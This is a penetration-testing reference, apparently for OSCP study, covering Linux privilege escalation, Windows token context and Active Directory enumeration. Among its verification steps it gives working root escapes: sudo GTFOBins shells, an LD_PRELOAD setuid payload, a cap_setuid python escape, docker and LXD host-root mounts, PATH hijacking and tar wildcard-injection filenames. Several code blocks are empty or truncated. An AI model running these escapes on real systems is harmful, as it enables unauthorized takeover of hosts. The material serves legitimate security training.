methods.title: Prove effective file, directory, ACL and mount control
methods.clue: A root-consumed file or directory appears writable
methods.conditions: Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately
methods.access: A verified Linux foothold with a known effective UID, groups and filesystem context
methods.result: A validated controlled object suitable for a specific execution or credential chain
methods.mechanics: Directory write plus traversal can allow replacement without direct file write. ACLs, sticky directories, immutable attributes and mount options can change the effective operation.
methods.example: Observation: a service script is read-only but its parent is writable. Test: inspect replacement rights and the service's actual path. Illustrative output: the caller can replace the exact consumed object. Interpretation: the control primitive exists; now verify privileged identity and trigger.
methods.verify: Prove the specific read/write/replace action and consumer path; world-writable alone is not the complete escalation chain.
methods.failure: A read-only/noexec/nosuid mount changes which effects are possible. Find another consumer rather than assuming every permission bypasses mount policy.

recognition.where: From a real privileged script/binary/configuration path inspect every parent, ACL and effective mount before assuming control.
recognition.sample:
file: root-owned, not directly writable
parent: current group has write+execute
mount: rw
recognition.spot: Parent replacement can provide a control primitive even when the existing file's write bit is absent.
recognition.confirm: Run namei -l, stat and getfacl on the exact path and its parents, then findmnt -T for ro/noexec/nosuid. Check the identity and trigger of the process that uses this path; write permission alone is not execution.
recognition.enabled: The precise object can be replaced and is consumed under a higher identity: choose that control path.
recognition.ruledout: Parent/file rights do not grant the needed operation: reject that proposed write.
recognition.unknown: An ACL listing without effective trustee/mount context leaves control unresolved.

methods.procedure:
```bash
namei -l /PATH/TO/OBJECT
stat /PATH/TO/OBJECT /PATH/TO/PARENT
getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS
```

> Directory write+execute can permit replacement even when the file is not writable. ACLs can add/remove effective access. `nosuid` defeats SUID/SGID and file-capability effects; `noexec` blocks direct execution; `ro` blocks changes.

Discover writable objects, then prioritize root-owned configuration, scripts, binaries and parents under `/etc`, `/opt`, `/usr/local`, application paths and service working directories:

```bash
find / -xdev -type f -writable -ls 2>/dev/null
find / -xdev -type d -writable -ls 2>/dev/null
```

```bash
history
ps auxww
env

```

Illustrative output: database access works but the same OS username does not. Interpretation: enumerate database rights instead of assuming universal reuse.

methods.failure: Stale examples and unrelated tokens are common. A denied process read is a visibility limit, not evidence that no credentials exist elsewhere.

Process: APP_SERVICE --config /opt/APP/config.ini
Readable file: /opt/APP/config.ini

methods.procedure:
```bash

find /home /root -maxdepth 3 -type f \
  \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \
     -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \

```

Inspect process arguments and readable process environment:

```bash

```

Check reusable local sessions/agents only when their sockets are accessible:

```bash
w; who; last -n 20

tmux ls 2>/dev/null
screen -ls 2>/dev/null
find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null
```

methods.title: Use an allowed sudo operation to cross a privilege boundary
methods.clue: sudo -l grants an operation under a more useful identity
methods.conditions: Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it
methods.access: A verified Linux foothold with a known effective UID, groups and filesystem context
methods.result: A verified privileged command, file operation or identity transition
methods.mechanics: Sudo grants a configured operation, not arbitrary root by default. Interpreter escapes, editors, file writers and helpers are different useful primitives whose exact invocation must fit the rule.
methods.example: Observation: the rule permits a specific interpreter as root without restricted arguments. Test: compare its documented privileged mode with the full rule and execute a minimal identity proof. Illustrative output: effective UID 0. Interpretation: verify host context and re-enumerate privileged files.
methods.verify: Verify the executed run-as identity and effective UID; preserve the matching rule and successful operation.
methods.failure: Restricted arguments, another run-as user, privilege dropping, NOEXEC or MAC policy can block the candidate. Evaluate another permitted primitive.

recognition.where: Run the exact sudo policy query from the current user and read run-as identity, executable, arguments and tags.
recognition.sample:
User USER may run:
    (root) NOPASSWD: /usr/bin/find
recognition.spot: The rule permits that exact program as root; its documented privileged operation becomes a candidate.
recognition.confirm: Read sudo -l: match the run-as user, exact executable and allowed arguments. Check NOPASSWD/password access and NOEXEC/environment restrictions; choose only the GTFOBins operation that the full rule permits, then verify id.
recognition.enabled: The allowed invocation exposes a useful operation and its effect is verified: choose that sudo method.
recognition.ruledout: Only a fixed harmless argument pattern is permitted: reject the unrestricted escape assumption.
recognition.unknown: A password-required response does not show the rule; obtain the legitimate credential/context before deciding.

methods.procedure:
```bash sudo -n -l 2>&1 sudo -l sudo --version ``` Record the run-as identity, password tag, executable path, argument constraints/wildcards and `SETENV`/`NOSETENV`/`env_keep`/`secure_path`/`NOEXEC`. Match the exact mode under [GTFOBins](https://gtfobins.github.io/). ```bash sudo /usr/bin/find . -exec /bin/sh \; -quit sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}' sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' ``` > Use an example only when the entire rule permits it. Restricted arguments, another path/build, privilege dropping, `NOEXEC`, a non-root run-as user or MAC policy can invalidate the escape.
Preserved LD_PRELOAD variant > Requires an explicitly allowed/preserved variable and a dynamically linked allowed program. ```bash sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD' ``` ```c #include #include void _init(void) { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/sh"); } ``` ```bash gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM ``` > Static linking, secure-loader behavior, missing environment permission or MAC denial disproves this route.

methods.access: A verified Linux foothold with a known effective UID, groups and filesystem context
methods.result: A verified privileged file operation or effective UID/GID transition
methods.mechanics: The mode bit changes execution credentials, but programs may drop them or constrain operations. A stock SUID listing is not a vulnerability; identify the exact program behavior.
methods.example: Observation: a custom SUID helper invokes another program by relative name. Test: inspect its call and inherited effective identity. Illustrative output: the helper retains root and resolves through a controlled path. Interpretation: apply the PATH method and verify the final identity.

methods.procedure:
```bash find / -xdev -type f -perm -4000 -ls 2>/dev/null find / -xdev -type f -perm -2000 -ls 2>/dev/null getcap -r / 2>/dev/null ``` Rank nonstandard/custom paths, unexpected versions, writable binaries/parents and dangerous interpreters. Inspect one candidate: ```bash namei -l /PATH/TO/BINARY stat /PATH/TO/BINARY file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' ldd /PATH/TO/BINARY 2>/dev/null strings /PATH/TO/BINARY | head -n 150 dpkg -S /PATH/TO/BINARY 2>/dev/null rpm -qf /PATH/TO/BINARY 2>/dev/null ``` > Look for a documented SUID/capability primitive, unsafe relative helper, arbitrary file operation, user-controlled config/plugin or exact vulnerable version. Normal distribution SUID files are not findings by themselves.
Capability interpretation and example High-value capability candidates include `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`, `cap_sys_ptrace`, `cap_sys_admin`, `cap_setfcap` and `cap_sys_module`. `cap_net_raw` is usually not a direct root transition. ```bash capsh --print 2>/dev/null grep '^Cap' /proc/self/status ``` Only when the exact interpreter has effective `cap_setuid`: ```bash /PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' ``` > `+ep` indicates permitted plus the file effective bit. Bounding sets, namespaces, `nosuid` mounts and program behavior can still change the result.

methods.title: Control a script, binary or configuration consumed by a privileged job/service
methods.clue: Root-owned cron, systemd or recurring process activity uses a controllable object
methods.conditions: Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger
methods.access: A verified Linux foothold with a known effective UID, groups and filesystem context
methods.result: Verified execution or a useful file operation under the job/service identity
methods.mechanics: Writable scripts and service units become useful only when the privileged consumer actually reads them. A timer schedule and a right to restart a service are different triggers.
methods.example: Observation: root runs a backup script on a timer. Test: prove the exact script path and effective write rights, then observe a controlled effect at its scheduled trigger. Illustrative output: a root-owned marker appears. Interpretation: privileged consumption is confirmed.

recognition.where: Inspect actual cron/systemd definitions and running processes, then follow their action paths into permission checks.

* * * * * root /opt/APP/backup.sh
Script path: /opt/APP/backup.sh
recognition.spot: The schedule explicitly names a privileged consumer and an exact file to inspect.
recognition.confirm: Observe the actual command and UID with pspy or inspect the unit with systemctl cat/show. Run namei -l, stat and getfacl on the consumed path and parents; identify the timer, restart or invocation before changing the file.
recognition.enabled: The controlled object is consumed at a confirmed privileged trigger: choose the job/service method.
recognition.ruledout: The real job runs as the same low user: reject privilege gain through that action.
recognition.unknown: A stale job file without observed activity/usable trigger leaves execution unresolved.

methods.procedure:
```bash
crontab -l 2>/dev/null
cat /etc/crontab
cat /etc/anacrontab 2>/dev/null
atq 2>/dev/null
ls -la /etc/cron.* /var/spool/cron 2>/dev/null
grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100

systemctl list-timers --all
systemctl list-unit-files --type=service
systemctl list-units --type=service --state=running
systemctl cat UNIT
systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles
```

Observe short-lived commands:

```bash
./pspy64

```

Validate every referenced script, binary, configuration, environment file, plugin and parent:

```bash
namei -l /PATH/TO/OBJECT
stat /PATH/TO/OBJECT /PATH/TO/PARENT
getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
```

> **Prove:** exact object is controllable → job/service consumes it → process runs as a higher identity → schedule/restart/other trigger is available. A writable unit still needs a privileged reload/restart or automatic trigger. Cron uses a different/minimal environment.

```bash
echo "$PATH" | tr ':' '\n'
echo "$PATH" | tr ':' '\n' | while IFS= read -r d; do
  [ -z "$d" ] && d=.
```

```bash
PATH=/WRITABLE/DIR:$PATH /PATH/TO/TRIGGER

```

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh proof.sh'
```

methods.clue: Membership or socket ACLs permit controlling a rootful daemon or useful session
methods.conditions: Effective daemon/API permission, correct rootful/rootless or privileged mode, available resources and a host-affecting operation
methods.access: A verified Linux foothold with a known effective UID, groups and filesystem context
methods.result: A verified privileged daemon operation or host-relevant access
methods.mechanics: Controlling a rootful container daemon can grant host-mount operations; root inside a restricted/rootless container is a different authority. Socket presence alone proves no API access.
methods.example: Observation: docker group access reaches a rootful daemon. Test: inspect its available image and mount permissions using the documented procedure. Illustrative output: a controlled container can read the intended host filesystem. Interpretation: verify host context before claiming host root.
methods.verify: Distinguish host and container namespace, effective UID and the exact host operation.
methods.failure: Rootless mode, user namespaces, policy or absent images can change the route. Do not equate a container prompt with host compromise.

recognition.where: Inspect groups, local sockets and namespace context, then use only permitted read-only daemon inventory to identify rootful/rootless behavior.
recognition.sample:
groups include docker
Socket group: docker; group read/write
Container/host context: verify separately
recognition.spot: Effective socket access suggests daemon control; group text alone does not establish host-affecting rootful operations.
recognition.confirm: Check API acceptance, rootful/rootless and namespace policy, available resources and the specific host operation.
recognition.enabled: A rootful daemon permits the required host-affecting operation: use that documented route.
recognition.ruledout: A rootless/user-namespaced daemon cannot grant the assumed host-root effect: reject that chain.
recognition.unknown: Socket presence without usable API permissions leaves the control claim unresolved.

methods.procedure:
```bash id ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null docker version 2>/dev/null lxc list 2>/dev/null ``` Group candidates include `docker`, `lxd`/`lxc`, `disk`, `shadow`, `adm`, `systemd-journal` and `libvirt`. Prove the associated resource and effective permission.
Rootful Docker daemon with an available image ```bash docker images docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh ``` > Requires daemon/socket access, a rootful daemon, usable image and allowed host bind mount. Rootless mode, user namespaces, authorization plugins and SELinux can change the effect.
LXD/LXC with an available image alias ```bash lxc image list lxc init IMAGE_ALIAS privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc /bin/sh ``` > Requires configured daemon access, sufficient group rights, image availability and privileged-container/device support.

methods.title: Exploit a permission-backed mount, NFS mapping or local service
methods.clue: A writable/exported filesystem or a loopback-only service with useful privileges
methods.conditions: Relevant export/mount options or service authentication; effective identity, writable path and any privileged execution consumer
methods.access: A verified Linux foothold with a known effective UID, groups and filesystem context
methods.result: A useful file/credential operation or verified local service access
methods.mechanics: A new mount or local listener changes reachable objects, not automatically privilege. NFS numeric-ID mapping, squash options and local service rights must be tested in their actual context.
methods.example: Observation: a loopback database is inaccessible externally. Test: identify its credentials and access it locally or through a justified forward. Illustrative output: data reads succeed as a limited DB user. Interpretation: follow the database's actual rights.
methods.verify: Verify the actual file/service operation, mapped identity and any resulting execution effect.
methods.failure: An exposed export or listener is only a candidate. Validate mapping, authentication and consumer before claiming escalation.

recognition.where: Inspect mounts, exports and local listeners after the foothold; correlate each with its identity and reachable service.
recognition.sample:
Listener: 127.0.0.1:DATABASE_PORT
Export option candidate: no_root_squash
recognition.spot: A local-only service or export mapping creates a specific investigation route, not automatic escalation.
recognition.confirm: For the service check accepted identity/rights; for NFS check client mapping, write permissions, mount flags and target-side consumer.
recognition.enabled: The complete mapped-file or authenticated local-service primitive is verified: select it.
recognition.ruledout: root_squash/nosuid or insufficient service rights defeats the proposed privileged chain.
recognition.unknown: Export text or a listen socket without actual access leaves the candidate incomplete.

methods.procedure:
```bash
findmnt
cat /etc/fstab
mount
ss -lntup
ss -lxnp
```

For NFS, a writable export plus `no_root_squash` can trust client-root-created ownership/SUID metadata. Confirm export options, writable mount, target-side mount options and compatible execution. See [NFS/RPC](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/02-service-enumeration/05-nfs-rpc.md).

Root-only loopback services and UNIX sockets are candidates only. Identify protocol/authentication and prove a privileged action through a controlled request, configuration, plugin or file.

methods.title: Control a privileged program's shared-library resolution
methods.clue: A privileged executable has an unsafe library dependency, RPATH/RUNPATH or plugin path
methods.conditions: Actual privileged load from a controlled location, matching ABI/name and required symbols, plus a trigger
methods.access: A verified Linux foothold with a known effective UID, groups and filesystem context
methods.result: Verified privileged initialization or behavior of a controlled shared object
methods.mechanics: The dynamic loader resolves dependencies using context-specific rules. A writable directory is irrelevant if secure execution or an earlier trusted resolution prevents loading from it.
methods.example: Observation: a custom privileged binary references a library in a writable search location. Test: confirm resolution and ABI, then trigger a minimal controlled effect. Illustrative output: library initialization runs under the higher identity. Interpretation: the library-consumption chain is verified.
methods.verify: Prove the selected library path and effective execution identity; retain dependency and trigger evidence.
methods.failure: Static linking, secure-loader sanitization, a different selected library or missing symbols breaks the route.

recognition.where: Inspect the reviewed privileged executable's dependencies/search paths and permission-check the actual selected library directory.
recognition.sample:
NEEDED: libAPP.so
RUNPATH: /CONTROLLED_LIBRARY_DIRECTORY
recognition.spot: A named dependency plus a potentially controlled search location is a loader-resolution candidate.
recognition.confirm: Verify actual runtime selection, ABI/symbols, secure-execution rules, retained privilege and a trigger.
recognition.enabled: The higher-identity process actually loads the controlled compatible library: select that chain.
recognition.ruledout: A protected earlier library or secure-loader behavior prevents selection: reject the assumed path.
recognition.unknown: Static dependency output alone leaves actual privileged resolution unknown.

methods.procedure:
```bash
file /PATH/TO/BINARY
readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
ldd /PATH/TO/BINARY 2>/dev/null
```

> Need a privileged dynamically linked consumer plus a missing/selected library resolved from a writable location or a preserved loader variable. Secure-execution mode strips many loader variables from SUID/SGID programs. Prefer `readelf` over executing an untrusted file through an unsafe `ldd` implementation.

For root-run scripts, inspect imports/includes and their actual search order. A writable current directory, module path or imported file can be a privileged input even when the main script is protected:

```bash
grep -nE '^(import|from) |require\(|include|source |\. ' /PATH/TO/SCRIPT
/PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))'
```

> Prove the privileged interpreter uses the writable module/include before changing it. The interactive interpreter's search path may differ from cron/systemd/sudo.

methods.title: Select an evidence-matched Linux software or kernel exploit
methods.clue: Permission/credential paths are insufficient and an exact affected build/configuration is present
methods.conditions: Vulnerable package/kernel state, architecture, mitigations, namespaces and documented exploit-specific conditions
methods.access: A verified Linux foothold with a known effective UID, groups and filesystem context
methods.result: A justified local exploit test and independently verified privilege result
methods.mechanics: Kernel release strings can hide patched distributions. A matching CVE needs affected code/configuration and compatible exploit assumptions; a crash is neither success nor proof that another build will work.
methods.example: Observation: an automated tool names a kernel CVE. Test: compare the distribution patch/build and required feature. Illustrative output: the vendor build includes the fix. Interpretation: reject the candidate and return to unexamined permissions/applications.
methods.verify: Verify actual effective UID/host context after the exploit, keeping the reviewed source and adaptation record.
methods.failure: Wrong build, missing feature or mitigation can invalidate the PoC. Choose another evidence-backed candidate rather than cycling random local exploits.

recognition.where: Collect distribution build/package/architecture and the required local feature before comparing a specific advisory/PoC.
recognition.sample:
Kernel release: KERNEL_RELEASE
Distribution package/build: VENDOR_BUILD
Required vulnerable feature: not yet verified
recognition.spot: A version-associated advisory is a candidate; backports and feature state determine applicability.
recognition.confirm: Collect uname and the distribution's package/build plus architecture. Match the advisory's vulnerable feature and vendor patch status before choosing a PoC; try a confirmed sudo/file/credential route first when one exists.
recognition.enabled: Affected code/configuration and compatible reviewed PoC are established: select its bounded test.
recognition.ruledout: The vendor build includes the fix or required feature is absent: reject that exploit.
recognition.unknown: A release string without patch/configuration evidence leaves vulnerability unconfirmed.

methods.procedure:
```bash
uname -a
cat /proc/version
cat /etc/os-release
dpkg -l 2>/dev/null
rpm -qa 2>/dev/null
sudo --version
lsmod
sysctl kernel.unprivileged_userns_clone 2>/dev/null
```

```bash
searchsploit "PRODUCT VERSION local privilege escalation"
searchsploit -x EDB_ID
searchsploit -m EDB_ID
gcc -Wall -Wextra exploit.c -o exploit
file exploit
sha256sum exploit
```

> Match component, exact distribution/build and patch/backport state, architecture, required configuration/capabilities/namespaces, mitigations and dependencies. Review source and recovery risk. A version title or successful compilation is only a candidate. Follow [public exploit adaptation](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/03-initial-access/06-public-exploit-adaptation.md).

methods.title: Use enumeration tools to generate manually testable candidates
methods.clue: A Linux foothold is available; run an early sweep for sudo rules, file capabilities, credentials and writable privileged paths
methods.conditions: Verified target UID and architecture, a working shell/runtime, a reviewed transferred tool and a writable report location
methods.access: A verified Linux foothold with a known effective UID, groups and filesystem context
methods.result: Candidate permissions, credentials and consumers for manual validation
methods.mechanics: Enumerators aggregate observations and heuristics. A highlighted path does not prove effective ACLs, privileged consumption, trigger or successful exploitation.
methods.checks:
```bash
id
uname -m
command -v bash python3
ls -ld /tmp
```
methods.example: Observation: LinPEAS highlights a writable path. Test: inspect its exact ACL, parent rights and consumer. Illustrative output: only an unprivileged process uses it. Interpretation: reject the escalation hypothesis while retaining the writable-path fact.
methods.verify: Read linpeas.txt. Confirm a reported sudo rule with sudo -l, a privileged path with namei/stat/getfacl, or a scheduled consumer with pspy before using that finding
methods.failure: Script blocked or output empty: check the shell, transfer integrity and output path, then use the native checks for the observed rule/file/job. Empty collector output does not rule out escalation

recognition.where: Use known manual gaps and the host/runtime context to choose a reviewed enumerator; inspect each highlighted finding against native evidence.
recognition.commands:
```bash
id
uname -m
command -v bash python3
ls -ld /tmp
```
recognition.sample:
Enumerator candidate: writable /opt/APP/script.sh
Consumer identity: unknown
Trigger: unknown
recognition.spot: The highlight supplies a candidate object, not the missing privileged consumer or execution trigger.
recognition.confirm: Run the reviewed LinPEAS baseline and save its output. For sudo highlights run sudo -l; for a flagged file use stat/namei/getfacl; for jobs confirm the UID and command with pspy or systemctl. Open the matching technique only after that check.
recognition.enabled: The full manual chain validates: follow its owning method.
recognition.ruledout: Only a low-privileged process consumes the object: reject the escalation hypothesis.
recognition.unknown: Missing tools or restricted /proc can hide evidence; investigate application-specific paths manually.

methods.procedure:
For the early collector pass, transfer a reviewed LinPEAS copy, check the current UID/architecture and save its output. This form does not require an executable bit:

```bash
sh ./linpeas.sh | tee linpeas.txt
```

Follow the named finding into the matching sudo, SUID/capability, writable-consumer or credential procedure. Use the local help for optional modes; broader/noisier checks are not the automatic baseline.


```bash
./linpeas.sh | tee linpeas.txt
./lse.sh | tee lse.txt
./lse.sh -l1 | tee lse-l1.txt
./unix-privesc-check standard > unix-privesc-check.txt
```

> LinPEAS optional flags vary by build. Read the local `./linpeas.sh -h` before selecting broader checks; they are not the automatic baseline. LSE progresses from default to `-l1`, then `-l2` only if needed. `unix-privesc-check detailed` is slower and more false-positive-prone.

For every highlight:

```text
exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification
```

Do not pipe an unverified Internet download into the target shell. Acquire a trusted copy, retain its source/hash, transfer deliberately and remove assessment artifacts when appropriate.

methods.title: Establish Windows token, host and process context
methods.clue: A new Windows session or claimed administrator/SYSTEM transition
methods.conditions: A functioning command channel and the actual effective token/process context
methods.access: A verified Windows foothold with a known token, integrity level and groups
methods.result: A verified identity, integrity, privilege and host state for candidate selection
methods.mechanics: Group membership can be filtered in a token, and a network logon context can differ from interactive access. Check privileges and integrity where the intended operation runs.
methods.example: Observation: the username belongs to Administrators. Test: inspect token groups/integrity and effective privileges. Illustrative output: the administrator SID is deny-only in a medium token. Interpretation: do not assume high-integrity service-control rights.
methods.verify: Verify represented user/SID, enabled group/privilege state and actual privileged operation.
methods.failure: A prompt title or account name is insufficient. WMIC may be absent; use the documented CIM/PowerShell alternatives.

recognition.where: At a new foothold inspect the complete token and host/service inventory before classifying the session as an administrator.
recognition.sample:
BUILTIN\Administrators: Group used for deny only
Mandatory Label\Medium Mandatory Level
recognition.spot: An Administrators SID exists but this effective process is filtered/medium-integrity.
recognition.confirm: Check actual enabled privileges and object operations in the process that will perform the action.
recognition.enabled: A higher-integrity/SYSTEM token and intended operation are verified: record that privilege state.
recognition.ruledout: A medium filtered token cannot perform the assumed administrative action: reject that privilege assumption.
recognition.unknown: Username/group membership alone leaves token state unknown; inspect whoami /all.

methods.procedure:
```cmd hostname whoami /all systeminfo ipconfig /all route print netstat -ano tasklist /svc query user net user net localgroup Administrators driverquery /v ``` ```powershell Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture Get-HotFix | Sort-Object InstalledOn -Descending Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName Get-CimInstance Win32_SystemDriver | Select-Object Name,State,StartMode,PathName Get-LocalUser Get-LocalGroupMember Administrators ``` > **Interpret:** record user SID, integrity label, enabled/deny-only groups and present/enabled privileges. Administrator membership with Medium integrity is a filtered token, not a high-integrity process. `Get-HotFix` does not list every update; use build/KB output only to form a version hypothesis.
WMIC compatibility fallbacks ```cmd wmic qfe get HotFixID,InstalledOn wmic service get Name,StartName,State,StartMode,PathName wmic process get ProcessId,Name,ExecutablePath,CommandLine ``` > WMIC is deprecated and may be absent on newer systems; PowerShell CIM is the baseline.
```cmd whoami /all hostname ipconfig /all ``` After a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. Preserve the command, relevant output, trigger and restoration step. For exam use, recheck the current OffSec guide: Windows full-privilege evidence requires SYSTEM, Administrator or an account with Administrator privileges, and AI/LLM use is prohibited during the exam and report phase.

methods.title: Establish domain identity, DC, DNS, time and route
methods.clue: Domain credentials or a domain-joined foothold
methods.conditions: Correct realm/domain and account qualification; reachable DC/services, usable DNS and acceptable clock skew
methods.access: A known domain identity or a directory endpoint that permits the selected anonymous query
methods.result: A verified domain context and working directory/authentication preflight
methods.mechanics: Local process identity, network credential context and domain naming are separate. Kerberos depends on service names, time and KDC connectivity in addition to a valid password.
methods.example: Observation: a valid domain password fails in a ticket-based client. Test: inspect DC naming, DNS, route and time. Illustrative output: the KDC is unreachable through the current route. Interpretation: fix transport before judging the credential.
methods.verify: Record represented identity, realm, selected DC, resolver, clock and real source route.
methods.failure: Wrong domain, KDC timeout, clock skew and account denial are distinct failures. Do not repeatedly change passwords to fix a route problem.

recognition.where: Start with the session identity and known credential scope; discover the realm/DC and inspect DNS, time and routes.
recognition.sample:
UPN: USER@DOMAIN
DC: \\DC_HOST
Domain name: DOMAIN
Clock source/status: inspect
recognition.spot: The named realm/DC and actual identity establish where directory/authentication checks must run.
recognition.confirm: Check DC/service reachability, resolver/SPN naming and clock compatibility, not merely the password.
recognition.enabled: A normal bind/ticket request works in the intended realm: continue domain mapping.
recognition.ruledout: The credential belongs only to the target-local account: reject the assumed domain identity.
recognition.unknown: DC lookup/time failure leaves domain authentication untested.

methods.procedure:
##### Domain-joined Windows source ```cmd whoami /all echo %USERDNSDOMAIN% echo %USERDOMAIN% echo %LOGONSERVER% nltest /dsgetdc:DOMAIN nltest /dclist:DOMAIN w32tm /query /status ``` ```powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.DOMAIN Resolve-DnsName -Type SRV _kerberos._tcp.DOMAIN ``` > **Decisive output:** domain FQDN, DC FQDN/IP, current user SID/groups, DNS SRV answers and a plausible time source. `USERDOMAIN` can be a NetBIOS label; prefer the DNS domain for LDAP/Kerberos. ##### Kali/off-domain source ```bash dig +short SRV _ldap._tcp.dc._msdcs.DOMAIN @DC_IP dig +short SRV _kerberos._tcp.DOMAIN @DC_IP nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' ldapsearch -x -LLL -H ldap://DC_HOST:389 -s base -b '' \ defaultNamingContext configurationNamingContext rootDomainNamingContext dnsHostName ``` > RootDSE is a directory-server metadata object. Reading it can reveal naming contexts even when anonymous subtree searches are denied. Convert `corp.example` to `DC=corp,DC=example`; do not guess the base DN when RootDSE can supply it.
Remote Windows session and double-hop caveat ```cmd whoami /all klist dir \\DC_HOST\SYSVOL ``` A supplied credential may create the remote session without being delegated onward to the DC. If local identity commands work but access to a second host fails, distinguish a WinRM/PowerShell remoting credential-delegation problem from invalid credentials. An interactive RDP session, explicit credentials, `/netonly` network credentials or an off-domain LDAP client may create a different context; always record which identity is used locally and over the network.
```text IDENTITY MAP: USER/COMPUTER -> DIRECT + NESTED GROUPS -> DIRECTORY RIGHTS HOST MAP: COMPUTER -> OS/ROLE -> LOCAL/REMOTE-ACCESS RIGHTS -> SESSIONS ROUTE MAP: SOURCE -> DNS/KDC/DC/HOST -> REQUIRED PORT/SERVICE LEAD MAP: EVIDENCE -> HYPOTHESIS -> MINIMUM VALIDATION -> NEXT BLOCK ``` Authentication, authorization, reachability and session presence are independent. A valid LDAP bind does not prove share access; SMB administration on one host does not prove directory privilege; a session edge does not prove retrievable credentials. ```text AS-REQ/AS-REP: user proves knowledge of long-term key -> receives TGT TGS-REQ/TGS-REP: TGT requests SERVICE/HOST -> receives service ticket AP-REQ: client presents service ticket -> service authenticates client AUTHORIZATION: target service still evaluates the represented identity/claims ``` Before changing credentials or tools: ```bash getent hosts DC_HOST nc -nvz DC_IP 88 date -u ``` ```cmd w32tm /query /status klist ``` Record domain FQDN/realm, DC FQDN/IP, source DNS, current time, KDC route and exact target SPN. IP connectivity does not replace hostname/SPN correctness.

methods.title: Enumerate directory objects with native, LDAP and PowerView approaches
methods.clue: A directory bind or domain-joined identity can read relevant objects
methods.conditions: Correct search base and authentication transport; object/attribute visibility and compatible local utilities
methods.access: A known domain identity or a directory endpoint that permits the selected anonymous query
methods.result: User, group, computer, trust and policy relationships for attack-path hypotheses
methods.mechanics: Tools expose the same directory through different interfaces. Group nesting, object types, primary groups and protected attributes affect how relationships translate into effective rights.
methods.example: Observation: a group appears to grant useful access. Test: enumerate its membership and nesting with the available native/LDAP method. Illustrative output: the controlled user is included through another group. Interpretation: validate the resulting destination/object right.
methods.verify: Retain object identifiers, group relationships and actual visibility; distinguish directory facts from inferred execution access.
methods.failure: Missing RSAT/PowerView does not block built-in ADSI or LDAP. Signing/TLS policy requires a compatible authenticated transport.

recognition.where: Use the available built-in/LDAP interface from the verified domain context; inspect one useful user/group before broad graph assumptions.
recognition.sample:
Account: USER
Global group memberships: GROUP
Group members: CONTROLLED_USER
recognition.spot: Account/group membership supplies a relationship to investigate; nested membership and effective destination rights remain separate.
recognition.confirm: Verify object SID/type, nesting and the exact right granted to that principal.
recognition.enabled: The membership resolves to a currently effective object/service right: follow that route.
recognition.ruledout: The same-named group belongs to another domain or grants no intended right: reject the assumed relationship.
recognition.unknown: Partial visibility or nesting not yet expanded leaves effective membership unresolved.

methods.procedure:
```cmd net user /domain net user USER /domain net group /domain net group "Domain Admins" /domain net group "GROUP" /domain net accounts /domain nltest /domain_trusts /all_trusts net view /domain net view \\DC_HOST ``` These commands are broadly available but provide partial views. Expand interesting users and groups individually, trace nested groups rather than assuming `memberOf` is complete, and retain SIDs when names can collide across domains.
RSAT ActiveDirectory module, only when installed ```powershell Get-Command -Module ActiveDirectory Get-ADDomain Get-ADForest Get-ADDomainController -Filter * Get-ADUser -Filter * -Properties Enabled,Description,MemberOf,ServicePrincipalName,UserPrincipalName,PasswordLastSet,LastLogonDate,AdminCount Get-ADGroup -Filter * -Properties GroupScope,GroupCategory,Members,Description Get-ADGroupMember -Identity 'GROUP' -Recursive Get-ADComputer -Filter * -Properties DNSHostName,OperatingSystem,OperatingSystemVersion,ServicePrincipalName,TrustedForDelegation,LastLogonDate Get-ADTrust -Filter * ``` `Get-AD*` cmdlets require the RSAT ActiveDirectory module. Its absence on a client is normal; use ADSI, LDAP, PowerView or an off-domain client.
